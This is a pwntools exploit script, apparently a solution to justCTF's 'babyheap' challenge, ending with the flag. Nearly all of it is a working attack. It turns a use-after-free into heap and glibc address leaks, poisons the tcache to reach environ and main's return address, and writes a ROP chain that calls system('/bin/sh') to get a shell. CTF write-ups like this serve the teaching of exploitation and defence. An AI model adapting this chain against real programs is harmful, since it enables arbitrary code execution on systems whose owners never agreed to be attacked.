from pwn import *

context.arch = 'amd64'
context.log_level = 'debug'
context.terminal = ['tmux', 'splitw', '-h']

p = gdb.debug('./babyheap_patched', '''
    b *(main+186)
    b *(main+193)
    b *(main+200)
    b *(main+207)
    continue
''')

# p = remote('baby-heap.nc.jctf.pro', 1337)

# create a chunk, of size 0x40 by malloc(0x30), at an valid index that is within a range of 0-0x13 and not used yet, with a content of 0x30 bytes at most (no heap buffer overflow)
def create_chunk(index, content):
    p.sendlineafter(b"> ", b'1')
    p.sendlineafter(b"Index? ", str(index).encode())
    p.sendafter(b"Content? ", content)

# read a chunk, at an valid index that is already used, with a content of 0x30 bytes printed out to stdout (leakage available)
def read_chunk(index):
    p.sendlineafter(b"> ", b'2')
    p.sendlineafter(b"Index? ", str(index).encode())
    return p.recvuntil(b"Menu:\n", drop=True)

# update a chunk, at an valid index that is already used, with a new content of 0x30 bytes at most (no heap buffer overflow)
def update_chunk(index, content):
    p.sendlineafter(b"> ", b'3')
    p.sendlineafter(b"Index? ", str(index).encode())
    p.sendafter(b"Content? ", content)

# delete a chunk, at an valid index that is already used, but not set its pointer to NULL (use-after-free available)
def delete_chunk(index):
    p.sendlineafter(b"> ", b'4')
    p.sendlineafter(b"Index? ", str(index).encode())

# quit program, by returning from main (ROP available)
def quit():
    p.sendlineafter(b"> ", b'0')

glibc_e = ELF('./libc.so.6')

# Stage 1: leak heap base address
create_chunk(0, b'A'*8)  # heap_base_addr+0x2a0
delete_chunk(0)  # heap_base_addr+0x2a0
heap_base_addr = ((u64(read_chunk(0)[0:8])<<12)^0)&~0xfff  # heap_base_addr+0x2a0
log.info(f"heap base address: {hex(heap_base_addr)}")

# Stage 2: leak glibc base address
# since all chunks are malloced to have a fixed size of 0x40, only way to put a glibc address onto heap is to produce a fake chunk of size 0x420 and make it able to be freed into unsorted bin
# allocate 4 chunks for multiple times of tcache poisoning
create_chunk(1, b'B'*8)  # heap_base_addr+0x2a0
create_chunk(2, b'C'*8)  # heap_base_addr+0x2e0
create_chunk(3, b'D'*8)  # heap_base_addr+0x320
create_chunk(4, b'E'*8)  # heap_base_addr+0x360
# allocate a target chunk for being faked into a chunk of size 0x420 later and then freed into unsorted bin
create_chunk(5, b'F'*8)  # heap_base_addr+0x3a0
# tcache poisoning to fake a chunk of size 0x420 at heap_base_addr+0x3a0, which will be freed into unsorted bin
delete_chunk(1)  # heap_base_addr+0x2a0
delete_chunk(2)  # heap_base_addr+0x2e0
update_chunk(2, p64((heap_base_addr+0x390)^((heap_base_addr+0x2e0)>>12)))  # heap_base_addr+0x2e0
create_chunk(6, b'G'*8)  # heap_base_addr+0x2e0
create_chunk(7, p64(0)+p64(0x421))  # heap_base_addr+0x390
# tcache poisoning to fake a chunk of size 0x20 at heap_base_addr+0x7c0, which will be used to avoid malloc consolidation
delete_chunk(6)  # heap_base_addr+0x2e0
delete_chunk(3)  # heap_base_addr+0x320
update_chunk(3, p64((heap_base_addr+0x7b0)^((heap_base_addr+0x320)>>12)))  # heap_base_addr+0x320
create_chunk(8, b'I'*8)  # heap_base_addr+0x320
create_chunk(9, p64(0)+p64(0x21))  # heap_base_addr+0x7b0
# tcache poisoning to fake a chunk of size 0x20830 at heap_base_addr+0x7e0, which makes top chunk legal
delete_chunk(8)  # heap_base_addr+0x320
delete_chunk(4)  # heap_base_addr+0x360
update_chunk(4, p64((heap_base_addr+0x7d0)^((heap_base_addr+0x360)>>12)))  # heap_base_addr+0x360
create_chunk(10, b'K'*8)  # heap_base_addr+0x360
create_chunk(11, p64(0)+p64(0x20831))  # heap_base_addr+0x7d0
# free target chunk into unsorted bin to pull duplicate glibc addresses into heap area
delete_chunk(5)  # heap_base_addr+0x3a0
glibc_base_addr = (u64(read_chunk(5)[0:8]))-0x203b20  # heap_base_addr+0x3a0
log.info(f"glibc base address: {hex(glibc_base_addr)}")

# Stage 3: tcache poisoning to leak return address of main based on stack address in environ
create_chunk(12, b'M'*8)  # heap_base_addr+0x3a0
delete_chunk(10)  # heap_base_addr+0x360
delete_chunk(12)  # heap_base_addr+0x3a0
update_chunk(12, p64((glibc_base_addr+glibc_e.sym.environ-0x18)^((heap_base_addr+0x3a0)>>12)))  # heap_base_addr+0x3a0
create_chunk(13, b'N'*8)  # heap_base_addr+0x3a0
create_chunk(14, b'O'*8)  # glibc_base_addr+glibc_e.sym.environ-0x18
main_return_addr = (u64(read_chunk(14)[0x18:0x20]))-0x130  # glibc_base_addr+glibc_e.sym.environ-0x18
log.info(f"main return address: {hex(main_return_addr)}")

# Stage 4: tcache poisoning to overwrite return address of main with a ROP chain to pop a shell
create_chunk(15, b'P'*8)  # heap_base_addr+0x3e0
delete_chunk(13)  # heap_base_addr+0x3a0
delete_chunk(15)  # heap_base_addr+0x3e0
update_chunk(15, p64((main_return_addr-8)^((heap_base_addr+0x3e0)>>12)))  # heap_base_addr+0x3e0
create_chunk(16, b'Q'*8)  # heap_base_addr+0x3e0
chain = [
    glibc_base_addr+next(glibc_e.search(asm('pop rdi; ret;'), executable=True)),
    glibc_base_addr+next(glibc_e.search(b'/bin/sh\x00')),
    glibc_base_addr+next(glibc_e.search(asm('ret;'), executable=True)),
    glibc_base_addr+glibc_e.sym.system
]
create_chunk(17, b'R'*8+b''.join([p64(c) for c in chain]))  # main_return_addr-8
# quit program, returning from main to trigger ROP chain execution
quit()

p.interactive()

# justCTF{ofc_the_R_in_CRUD_stands_for_ROPchain}